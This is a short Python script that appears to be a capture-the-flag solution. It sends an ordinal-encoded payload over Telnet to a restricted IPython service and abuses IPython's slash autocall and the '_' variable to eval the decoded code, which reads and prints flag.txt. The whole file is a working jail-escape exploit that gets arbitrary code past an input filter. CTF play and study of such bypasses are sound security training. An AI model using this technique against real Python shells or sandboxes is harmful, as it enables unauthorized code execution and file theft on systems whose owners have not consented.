#/usr/bin/env python3
from telnetlib import Telnet

def encode(str) -> str:
    """
    Gotcha:
    The leading slash in IPython will transform the input, 
    adding brackets and commas as if it were a function call.
    The encoding itself uses %c formatting to get a string from ordinals.
    '%c%c'% 50 50 ==> '%c%c'% (50, 50) ==> FF
    """
    ords = ["{}".format(ord(x)) for x in str]
    return "/'{}'% {}".format("%c"*len(ords), " ".join(ords))

# one-liner to print flag.txt
readflag = "(lambda x=open('flag.txt'): print(x.read()))()"

readflag_enc = encode(readflag)
print("Encoded flag:\n{}\n".format(readflag_enc))

with Telnet("localhost", 5656) as t:
    # No need to wait for the other side.
    # This encode is utf8 stuff, not related to the encode func btw ;)
    t.write(readflag_enc.encode() + b"\n")

    #readflag is now decompiled in IPython's Out. All that's left is use it.
    #"_" in IPython contains the last returned value. We can call eval without brackets using "/".
    t.write(b"/eval _\n")

    # Let's get the flag! :)
    print(t.read_until(b"36c3").decode(), end="")
    print(t.read_until(b"\n").decode())

    # Now we could start a "normal" session to play around with the server some more.
    #t.interact()